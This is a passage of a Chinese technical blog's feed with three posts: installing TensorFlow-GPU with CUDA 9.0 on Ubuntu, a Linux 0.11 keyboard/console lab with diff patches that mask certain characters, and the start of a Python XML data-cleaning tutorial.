cuda-cufft-9-0 cuda-curand-9-0 \</span><br><span class="line">    cuda-cusolver-9-0 cuda-cusparse-9-0 libcudnn7=7.2.1.38-1+cuda9.0 \</span><br><span class="line">    libnccl2=2.2.13-1+cuda9.0 cuda-command-line-tools-9-0</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># Optional: Install the TensorRT runtime (must be after CUDA install)</span></span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install libnvinfer4=4.1.2-1+cuda9.0</span><br></pre></td></tr></table></figure><p>注意不要重复安装nvidia显卡驱动。<br>然后设置环境变量<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">export</span> PATH=/usr/<span class="hljs-built_in">local</span>/cuda-9.0/bin/:<span class="hljs-variable">$PATH</span></span><br><span class="line"><span class="hljs-built_in">export</span> LD_LIBRARY_PATH=<span class="hljs-variable">$LD_LIBRARY_PATH</span>:/usr/<span class="hljs-built_in">local</span>/cuda-9.0/extras/CUPTI/lib64</span><br></pre></td></tr></table></figure></p><p>检验下安装<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wmc@OMEN:~$ nvcc -V</span><br><span class="line">nvcc: NVIDIA (R) Cuda compiler driver</span><br><span class="line">Copyright (c) 2005-2017 NVIDIA Corporation</span><br><span class="line">Built on Fri_Sep__1_21:08:03_CDT_2017</span><br><span class="line">Cuda compilation tools, release 9.0, V9.0.176</span><br></pre></td></tr></table></figure></p><h3 id="Anaconda"><a href="#Anaconda" class="headerlink" title="Anaconda"></a>Anaconda</h3><p>Anaconda安装十分简单。<br>安装完成后，我们使用创建一个新的python虚拟环境，安装tensorflow-gpu.<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">conda create -n tensor pip python=3.6</span><br><span class="line"><span class="hljs-built_in">source</span> activate tensor</span><br><span class="line">pip install --upgrade tensorflow-gpu</span><br></pre></td></tr></table></figure></p><p>然后使用示例程序来测试一下.<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> tensorflow <span class="hljs-keyword">as</span> tf</span><br><span class="line">mnist = tf.keras.datasets.mnist</span><br><span class="line"></span><br><span class="line">(x_train, y_train),(x_test, y_test) = mnist.load_data()</span><br><span class="line">x_train, x_test = x_train / <span class="hljs-number">255.0</span>, x_test / <span class="hljs-number">255.0</span></span><br><span class="line"></span><br><span class="line">model = tf.keras.models.Sequential([</span><br><span class="line">  tf.keras.layers.Flatten(),</span><br><span class="line">  tf.keras.layers.Dense(<span class="hljs-number">512</span>, activation=tf.nn.relu),</span><br><span class="line">  tf.keras.layers.Dropout(<span class="hljs-number">0.2</span>),</span><br><span class="line">  tf.keras.layers.Dense(<span class="hljs-number">10</span>, activation=tf.nn.softmax)</span><br><span class="line">])</span><br><span class="line">model.compile(optimizer=<span class="hljs-string">'adam'</span>,</span><br><span class="line">              loss=<span class="hljs-string">'sparse_categorical_crossentropy'</span>,</span><br><span class="line">              metrics=[<span class="hljs-string">'accuracy'</span>])</span><br><span class="line"></span><br><span class="line">model.fit(x_train, y_train, epochs=<span class="hljs-number">5</span>)</span><br><span class="line">model.evaluate(x_test, y_test)</span><br></pre></td></tr></table></figure></p><p>查看下，运行时gpu显存飙升，占用率升到50%，确实是启用了tensorflow-gpu.<br><img src="/2019/02/01/Ubuntu18-04安装TensorFlow-gpu/run.png" alt=""></p><h4 id="jupyter支持conda虚拟环境内核"><a href="#jupyter支持conda虚拟环境内核" class="headerlink" title="jupyter支持conda虚拟环境内核"></a>jupyter支持conda虚拟环境内核</h4><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">conda activate tensorflowenv</span><br><span class="line">pip install ipykernel</span><br><span class="line">python -m ipykernel install --user --name tensorflowenv --display-name <span class="hljs-string">"Python (tensorflowenv)"</span></span><br></pre></td></tr></table></figure><h4 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h4><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conda install -c conda-forge jupyter_contrib_nbextensions</span><br><span class="line">jupyter contrib nbextension install --user</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> tensorflow </category>
          
          <category> ubuntu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>I/O_lab</title>
      <link href="/2018/12/28/I-O-lab/"/>
      <url>/2018/12/28/I-O-lab/</url>
      
        <content type="html"><![CDATA[<h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><a id="more"></a><p>本次试验中，主要涉及keyboard.S，tty_io.c，console.c。其中：keyboard.S主要实现键盘中断处理过程，当按下键盘时，出发中断，由对应函数进行处理，并将字符放入read_q写队列中；tty_io.c包含tty字符设备读函数tty_read()和tty_write()，为文件系统提供了上层访问接口，copy_to_cooked()将输入字符处理后添加到tty辅助队列secondary中，若开启了回显功能，则还会将其添加到write_q写队列中，由console.c中的con_write()函数中写入到终端。<br><img src="/2018/12/28/I-O-lab/lab4.png" alt=""></p><p><img src="/2018/12/28/I-O-lab/struct.png" alt=""></p><h4 id="phase1"><a href="#phase1" class="headerlink" title="phase1"></a>phase1</h4><p>此关要求将f12作为一个开关，用于启用/关闭*模式，我们需要加一个全局变量用以标示是否开启改模式。首先需要对keyboard.S进行改动，使按下f12时执行正确的中断调用。我们可以见得，functions按键由func函数进行处理，当检测到按下的为f12时，调用change_f12Flag()函数更改标志变量f12Flag。</p><p><img src="/2018/12/28/I-O-lab/keyboard.png" alt=""></p><p>我们在f12中声明f12Flag，并且将该函数放置在其中，供keyboard.S调用处理按下f12的情况。</p><p><img src="/2018/12/28/I-O-lab/tty.png" alt=""></p><p>并且在console.c中引入外部变量f12Flag，对输出加以更改。当f12Flag非0时，将姓名拼音首位字母变为*。</p><p><img src="/2018/12/28/I-O-lab/con_w.png" alt=""></p><p>至此，修改完成，我们make生成image之后，运行./run脚本，开启boch虚拟机。</p><p><img src="/2018/12/28/I-O-lab/run.png" alt=""></p><p>运行正确。</p><h4 id="phase2"><a href="#phase2" class="headerlink" title="phase2"></a>phase2</h4><p>此阶段，和phase1相似，只是将开启/关闭条件改为了学号/学号-。那么我们在tty_io.c中加入一个有限状态自动机即可，copy_to_cooked()会将输入字符加入到tty辅助队列和tty写入队列，我们状态机代码放在此处,，以变量leng_fit表示状态，根据输入字符更改状态。</p><p><img src="/2018/12/28/I-O-lab/long_fit.png" alt=""></p><p><img src="/2018/12/28/I-O-lab/machine.png" alt=""></p><p>然后我们在console.c中引入外部变量leng_fit，当leng_fit为10时，改变输出。</p><p><img src="/2018/12/28/I-O-lab/con2.png" alt=""></p><p>我们make后运行。</p><p><img src="/2018/12/28/I-O-lab/run2.png" alt=""></p><p>成功。</p><h4 id="制作补丁"><a href="#制作补丁" class="headerlink" title="制作补丁"></a>制作补丁</h4><p>为了方便保存更改后的代码，我们使用diff指令制作补丁，方便以后使用patch恢复。</p><p>生成补丁如下。</p><p>phase1.patch</p><figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">diff -ru linux<span class="hljs-number">-0.11</span>-bk/kernel/chr_drv/console.c linux<span class="hljs-number">-0.11</span>/kernel/chr_drv/console.c</span><br><span class="line">--- linux<span class="hljs-number">-0.11</span>-bk/kernel/chr_drv/console.c<span class="hljs-number">2008</span><span class="hljs-number">-08</span><span class="hljs-number">-28</span> <span class="hljs-number">13</span>:<span class="hljs-number">14</span>:<span class="hljs-number">58.000000000</span> +<span class="hljs-number">0800</span></span><br><span class="line">+++ linux<span class="hljs-number">-0.11</span>/kernel/chr_drv/console.c<span class="hljs-number">2018</span><span class="hljs-number">-12</span><span class="hljs-number">-28</span> <span class="hljs-number">22</span>:<span class="hljs-number">25</span>:<span class="hljs-number">05.249893925</span> +<span class="hljs-number">0800</span></span><br><span class="line">@@ <span class="hljs-number">-54</span>,<span class="hljs-number">7</span> +<span class="hljs-number">54</span>,<span class="hljs-number">7</span> @@</span><br><span class="line"> <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NPAR 16</span></span><br><span class="line"> </span><br><span class="line"> <span class="hljs-function"><span class="hljs-keyword">extern</span> <span class="hljs-keyword">void</span> <span class="hljs-title">keyboard_interrupt</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;</span><br><span class="line">-</span><br><span class="line">+<span class="hljs-keyword">extern</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> f12Flag;</span><br><span class="line"> <span class="hljs-keyword">static</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>video_type;<span class="hljs-comment">/* Type of display being used*/</span></span><br><span class="line"> <span class="hljs-keyword">static</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>video_num_columns;<span class="hljs-comment">/* Number of text columns*/</span></span><br><span class="line"> <span class="hljs-keyword">static</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>video_size_row;<span class="hljs-comment">/* Bytes per row*/</span></span><br><span class="line">@@ <span class="hljs-number">-450</span>,<span class="hljs-number">6</span> +<span class="hljs-number">450</span>,<span class="hljs-number">8</span> @@</span><br><span class="line"> nr = CHARS(tty-&gt;write_q);</span><br><span class="line"> <span class="hljs-keyword">while</span> (nr--) &#123;</span><br><span class="line"> GETCH(tty-&gt;write_q,c);</span><br><span class="line">+<span class="hljs-keyword">if</span>(f12Flag &amp;&amp; (c == <span class="hljs-string">'w'</span> || c == <span class="hljs-string">'o'</span>))</span><br><span class="line">+c = <span class="hljs-string">'*'</span>;</span><br><span class="line"> <span class="hljs-keyword">switch</span>(state) &#123;</span><br><span class="line"> <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:</span><br><span class="line"> <span class="hljs-keyword">if</span> (c&gt;<span class="hljs-number">31</span> &amp;&amp; c&lt;<span class="hljs-number">127</span>) &#123;</span><br><span class="line">diff -ru linux<span class="hljs-number">-0.11</span>-bk/kernel/chr_drv/keyboard.S linux<span class="hljs-number">-0.11</span>/kernel/chr_drv/keyboard.S</span><br><span class="line">--- linux<span class="hljs-number">-0.11</span>-bk/kernel/chr_drv/keyboard.S<span class="hljs-number">2008</span><span class="hljs-number">-08</span><span class="hljs-number">-28</span> <span class="hljs-number">13</span>:<span class="hljs-number">14</span>:<span class="hljs-number">58.000000000</span> +<span class="hljs-number">0800</span></span><br><span class="line">+++ linux<span class="hljs-number">-0.11</span>/kernel/chr_drv/keyboard.S<span class="hljs-number">2018</span><span class="hljs-number">-12</span><span class="hljs-number">-28</span> <span class="hljs-number">22</span>:<span class="hljs-number">25</span>:<span class="hljs-number">05.249893925</span> +<span class="hljs-number">0800</span></span><br><span class="line">@@ <span class="hljs-number">-224</span>,<span class="hljs-number">6</span> +<span class="hljs-number">224</span>,<span class="hljs-number">7</span> @@</span><br><span class="line"> jb end_func</span><br><span class="line"> cmpb $<span class="hljs-number">11</span>,%al</span><br><span class="line"> ja end_func</span><br><span class="line">+call change_f12Flag</span><br><span class="line"> ok_func:</span><br><span class="line"> cmpl $<span class="hljs-number">4</span>,%ecx<span class="hljs-comment">/* check that there is enough room */</span></span><br><span class="line"> jl end_func</span><br><span class="line">diff -ru linux<span class="hljs-number">-0.11</span>-bk/kernel/chr_drv/tty_io.c linux<span class="hljs-number">-0.11</span>/kernel/chr_drv/tty_io.c</span><br><span class="line">--- linux<span class="hljs-number">-0.11</span>-bk/kernel/chr_drv/tty_io.c<span class="hljs-number">2008</span><span class="hljs-number">-08</span><span class="hljs-number">-28</span> <span class="hljs-number">13</span>:<span class="hljs-number">14</span>:<span class="hljs-number">58.000000000</span> +<span class="hljs-number">0800</span></span><br><span class="line">+++ linux<span class="hljs-number">-0.11</span>/kernel/chr_drv/tty_io.c<span class="hljs-number">2018</span><span class="hljs-number">-12</span><span class="hljs-number">-28</span> <span class="hljs-number">22</span>:<span class="hljs-number">25</span>:<span class="hljs-number">05.249893925</span> +<span class="hljs-number">0800</span></span><br><span class="line">@@ <span class="hljs-number">-47</span>,<span class="hljs-number">7</span> +<span class="hljs-number">47</span>,<span class="hljs-number">7</span> @@</span><br><span class="line"> <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> O_CRNL(tty)_O_FLAG((tty),OCRNL)</span></span><br><span class="line"> <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> O_NLRET(tty)_O_FLAG((tty),ONLRET)</span></span><br><span class="line"> <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> O_LCUC(tty)_O_FLAG((tty),OLCUC)</span></span><br><span class="line">-</span><br><span class="line">+<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> f12Flag;</span><br><span class="line"> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_struct</span> <span class="hljs-title">tty_table</span>[] = &#123;</span></span><br><span class="line"> &#123;</span><br><span class="line"> &#123;ICRNL,<span class="hljs-comment">/* change incoming CR to NL */</span></span><br><span class="line">@@ <span class="hljs-number">-348</span>,<span class="hljs-number">3</span> +<span class="hljs-number">348</span>,<span class="hljs-number">7</span> @@</span><br><span class="line"> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">chr_dev_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span></span><br><span class="line"><span class="hljs-function"> </span>&#123;</span><br><span class="line"> &#125;</span><br><span class="line">+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">change_f12Flag</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span></span><br><span class="line">+&#123;</span><br><span class="line">+f12Flag = ~f12Flag;</span><br><span class="line">+&#125;</span><br></pre></td></tr></table></figure><p>phase2.patch</p><figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">diff -ru linux<span class="hljs-number">-0.11</span>-bk/kernel/chr_drv/console.c linux<span class="hljs-number">-0.11</span>/kernel/chr_drv/console.c</span><br><span class="line">--- linux<span class="hljs-number">-0.11</span>-bk/kernel/chr_drv/console.c<span class="hljs-number">2008</span><span class="hljs-number">-08</span><span class="hljs-number">-28</span> <span class="hljs-number">13</span>:<span class="hljs-number">14</span>:<span class="hljs-number">58.000000000</span> +<span class="hljs-number">0800</span></span><br><span class="line">+++ linux<span class="hljs-number">-0.11</span>/kernel/chr_drv/console.c<span class="hljs-number">2018</span><span class="hljs-number">-12</span><span class="hljs-number">-28</span> <span class="hljs-number">18</span>:<span class="hljs-number">23</span>:<span class="hljs-number">00.272667952</span> +<span class="hljs-number">0800</span></span><br><span class="line">@@ <span class="hljs-number">-54</span>,<span class="hljs-number">6</span> +<span class="hljs-number">54</span>,<span class="hljs-number">7</span> @@</span><br><span class="line"> <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NPAR 16</span></span><br><span class="line"> </span><br><span class="line"> <span class="hljs-function"><span class="hljs-keyword">extern</span> <span class="hljs-keyword">void</span> <span class="hljs-title">keyboard_interrupt</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;</span><br><span class="line">+<span class="hljs-keyword">extern</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> leng_fit;</span><br><span class="line"> </span><br><span class="line"> <span class="hljs-keyword">static</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>video_type;<span class="hljs-comment">/* Type of display being used*/</span></span><br><span class="line"> <span class="hljs-keyword">static</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>video_num_columns;<span class="hljs-comment">/* Number of text columns*/</span></span><br><span class="line">@@ <span class="hljs-number">-448</span>,<span class="hljs-number">8</span> +<span class="hljs-number">449</span>,<span class="hljs-number">13</span> @@</span><br><span class="line"> <span class="hljs-keyword">char</span> c;</span><br><span class="line"> </span><br><span class="line"> nr = CHARS(tty-&gt;write_q);</span><br><span class="line">+</span><br><span class="line">+</span><br><span class="line"> <span class="hljs-keyword">while</span> (nr--) &#123;</span><br><span class="line"> GETCH(tty-&gt;write_q,c);</span><br><span class="line">+</span><br><span class="line">+<span class="hljs-keyword">if</span>((c == <span class="hljs-number">119</span> || c == <span class="hljs-number">111</span>) &amp;&amp; leng_fit == <span class="hljs-number">10</span>)</span><br><span class="line">+                c = <span class="hljs-string">'*'</span>;</span><br><span class="line"> <span class="hljs-keyword">switch</span>(state) &#123;</span><br><span class="line"> <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:</span><br><span class="line"> <span class="hljs-keyword">if</span> (c&gt;<span class="hljs-number">31</span> &amp;&amp; c&lt;<span class="hljs-number">127</span>) &#123;</span><br><span class="line">diff -ru linux<span class="hljs-number">-0.11</span>-bk/kernel/chr_drv/tty_io.c linux<span class="hljs-number">-0.11</span>/kernel/chr_drv/tty_io.c</span><br><span class="line">--- linux<span class="hljs-number">-0.11</span>-bk/kernel/chr_drv/tty_io.c<span class="hljs-number">2008</span><span class="hljs-number">-08</span><span class="hljs-number">-28</span> <span class="hljs-number">13</span>:<span class="hljs-number">14</span>:<span class="hljs-number">58.000000000</span> +<span class="hljs-number">0800</span></span><br><span class="line">+++ linux<span class="hljs-number">-0.11</span>/kernel/chr_drv/tty_io.c<span class="hljs-number">2018</span><span class="hljs-number">-12</span><span class="hljs-number">-28</span> <span class="hljs-number">18</span>:<span class="hljs-number">22</span>:<span class="hljs-number">43.084621806</span> +<span class="hljs-number">0800</span></span><br><span class="line">@@ <span class="hljs-number">-47</span>,<span class="hljs-number">7</span> +<span class="hljs-number">47</span>,<span class="hljs-number">7</span> @@</span><br><span class="line"> <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> O_CRNL(tty)_O_FLAG((tty),OCRNL)</span></span><br><span class="line"> <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> O_NLRET(tty)_O_FLAG((tty),ONLRET)</span></span><br><span class="line"> <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> O_LCUC(tty)_O_FLAG((tty),OLCUC)</span></span><br><span class="line">-</span><br><span class="line">+<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> leng_fit = <span class="hljs-number">0</span>;</span><br><span class="line"> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_struct</span> <span class="hljs-title">tty_table</span>[] = &#123;</span></span><br><span class="line"> &#123;</span><br><span class="line"> &#123;ICRNL,<span class="hljs-comment">/* change incoming CR to NL */</span></span><br><span class="line">@@ <span class="hljs-number">-148</span>,<span class="hljs-number">6</span> +<span class="hljs-number">148</span>,<span class="hljs-number">70</span> @@</span><br><span class="line"> </span><br><span class="line"> <span class="hljs-keyword">while</span> (!EMPTY(tty-&gt;read_q) &amp;&amp; !FULL(tty-&gt;secondary)) &#123;</span><br><span class="line"> GETCH(tty-&gt;read_q,c);</span><br><span class="line">+<span class="hljs-keyword">switch</span>(leng_fit)&#123;</span><br><span class="line">+    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:</span><br><span class="line">+<span class="hljs-keyword">if</span>(c == <span class="hljs-number">50</span>)</span><br><span class="line">+    leng_fit++;</span><br><span class="line">+<span class="hljs-keyword">break</span>;</span><br><span class="line">+    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:</span><br><span class="line">+<span class="hljs-keyword">if</span>(c == <span class="hljs-number">48</span>)</span><br><span class="line">+    leng_fit++;</span><br><span class="line">+<span class="hljs-keyword">else</span></span><br><span class="line">+    leng_fit = <span class="hljs-number">0</span>;</span><br><span class="line">+<span class="hljs-keyword">break</span>;</span><br><span class="line">+    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:</span><br><span class="line">+<span class="hljs-keyword">if</span>(c == <span class="hljs-number">49</span>)</span><br><span class="line">+    leng_fit++;</span><br><span class="line">+<span class="hljs-keyword">else</span></span><br><span class="line">+    leng_fit = <span class="hljs-number">0</span>;</span><br><span class="line">+<span class="hljs-keyword">break</span>;</span><br><span class="line">+    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:</span><br><span class="line">+<span class="hljs-keyword">if</span>(c == <span class="hljs-number">55</span>)</span><br><span class="line">+    leng_fit++;</span><br><span class="line">+<span class="hljs-keyword">else</span></span><br><span class="line">+    leng_fit = <span class="hljs-number">0</span>;</span><br><span class="line">+<span class="hljs-keyword">break</span>;</span><br><span class="line">+    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:</span><br><span class="line">+<span class="hljs-keyword">if</span>(c == <span class="hljs-number">50</span>)</span><br><span class="line">+    leng_fit++;</span><br><span class="line">+<span class="hljs-keyword">else</span></span><br><span class="line">+    leng_fit = <span class="hljs-number">0</span>;</span><br><span class="line">+<span class="hljs-keyword">break</span>;</span><br><span class="line">+    <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:</span><br><span class="line">+<span class="hljs-keyword">if</span>(c == <span class="hljs-number">49</span>)</span><br><span class="line">+    leng_fit++;</span><br><span class="line">+<span class="hljs-keyword">else</span></span><br><span class="line">+    leng_fit = <span class="hljs-number">0</span>;</span><br><span class="line">+<span class="hljs-keyword">break</span>;</span><br><span class="line">+    <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:</span><br><span class="line">+<span class="hljs-keyword">if</span>(c == <span class="hljs-number">49</span>)</span><br><span class="line">+    leng_fit++;</span><br><span class="line">+<span class="hljs-keyword">else</span></span><br><span class="line">+    leng_fit = <span class="hljs-number">0</span>;</span><br><span class="line">+<span class="hljs-keyword">break</span>;</span><br><span class="line">+    <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:</span><br><span class="line">+<span class="hljs-keyword">if</span>(c == <span class="hljs-number">53</span>)</span><br><span class="line">+    leng_fit++;</span><br><span class="line">+<span class="hljs-keyword">else</span></span><br><span class="line">+    leng_fit = <span class="hljs-number">0</span>;</span><br><span class="line">+<span class="hljs-keyword">break</span>;</span><br><span class="line">+    <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:</span><br><span class="line">+<span class="hljs-keyword">if</span>(c == <span class="hljs-number">50</span>)</span><br><span class="line">+    leng_fit++;</span><br><span class="line">+<span class="hljs-keyword">else</span></span><br><span class="line">+    leng_fit = <span class="hljs-number">0</span>;</span><br><span class="line">+<span class="hljs-keyword">break</span>;</span><br><span class="line">+    <span class="hljs-keyword">case</span> <span class="hljs-number">9</span>:</span><br><span class="line">+<span class="hljs-keyword">if</span>(c == <span class="hljs-number">51</span>)</span><br><span class="line">+    leng_fit++;</span><br><span class="line">+<span class="hljs-keyword">else</span></span><br><span class="line">+    leng_fit = <span class="hljs-number">0</span>;</span><br><span class="line">+<span class="hljs-keyword">break</span>;</span><br><span class="line">+    <span class="hljs-keyword">case</span> <span class="hljs-number">10</span>:</span><br><span class="line">+<span class="hljs-keyword">if</span>(c == <span class="hljs-number">45</span>)</span><br><span class="line">+    leng_fit = <span class="hljs-number">0</span>;</span><br><span class="line">+<span class="hljs-keyword">break</span>;     </span><br><span class="line">+&#125;</span><br><span class="line"> <span class="hljs-keyword">if</span> (c==<span class="hljs-number">13</span>)</span><br><span class="line"> <span class="hljs-keyword">if</span> (I_CRNL(tty))</span><br><span class="line"> c=<span class="hljs-number">10</span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CS:APP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CS:APP </tag>
            
            <tag> linux内核 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python数据清洗初步</title>
      <link href="/2018/12/09/Python%E6%95%B0%E6%8D%AE%E6%B8%85%E6%B4%97%E5%88%9D%E6%AD%A5/"/>
      <url>/2018/12/09/Python%E6%95%B0%E6%8D%AE%E6%B8%85%E6%B4%97%E5%88%9D%E6%AD%A5/</url>
      
        <content type="html"><![CDATA[<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><a id="more"></a><p>XML是一种可扩展标记语言，被用来传输和存储数据。它是一种有逻辑的树结构。</p><h4 id="Python使用xml-ElementTree解析"><a href="#Python使用xml-ElementTree解析" class="headerlink" title="Python使用xml.ElementTree解析"></a>Python使用xml.ElementTree解析</h4><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> xml.etree.ElementTree <span class="hljs-keyword">as</span> ET</span><br><span class="line"><span class="hljs-keyword">import</span> codecs</span><br><span class="line"><span class="hljs-keyword">import</span> json</span><br></pre></td></tr></table></figure><p>codecs用于打开文件，json用于保存清洗完的数据。</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tree = ET.parse()<span class="hljs-comment">#获取目录树</span></span><br><span class="line">root = tree.getroot() <span class="hljs-comment">#得到树根 </span></span><br><span class="line">root = ET.fromstring()<span class="hljs-comment">#从字符串直接解析出树根</span></span><br></pre></td></tr></table></figure><p>获取树根，然后进行操作</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 